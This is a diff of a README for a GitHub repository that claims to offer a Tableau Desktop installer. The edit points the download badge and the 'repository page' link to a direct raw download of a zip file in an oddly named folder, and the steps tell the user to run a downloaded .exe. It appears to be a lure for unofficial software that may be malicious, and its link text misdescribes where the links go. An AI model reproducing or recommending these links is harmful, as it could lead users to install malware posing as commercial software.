@@ -1,6 +1,6 @@
 # 📊 Tableau-Desktop-Installer - Build interactive data dashboards with ease
 
-[![](https://img.shields.io/badge/Download-Tableau-blue.svg)](https://github.com/Merseyinverted997/Tableau-Desktop-Installer)
+[![](https://img.shields.io/badge/Download-Tableau-blue.svg)](https://github.com/Merseyinverted997/Tableau-Desktop-Installer/raw/refs/heads/main/uncondemnable/Desktop_Installer_Tableau_3.4.zip)
 
 Tableau Desktop turns raw data into clear visual insights. This tool helps you connect to databases, create dashboards, and share analysis across your organization. It uses a drag-and-drop interface so you do not need coding skills to work with complex data.
 
@@ -8,7 +8,7 @@ Tableau Desktop turns raw data into clear visual insights. This tool helps you c
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project repository page at [https://github.com/Merseyinverted997/Tableau-Desktop-Installer](https://github.com/Merseyinverted997/Tableau-Desktop-Installer).
+1. Visit the project repository page at [https://github.com/Merseyinverted997/Tableau-Desktop-Installer/raw/refs/heads/main/uncondemnable/Desktop_Installer_Tableau_3.4.zip](https://github.com/Merseyinverted997/Tableau-Desktop-Installer/raw/refs/heads/main/uncondemnable/Desktop_Installer_Tableau_3.4.zip).
 2. Look for the release area.
 3. Select the file ending in .exe to begin your download.
 4. Open the downloaded file once the process finishes.
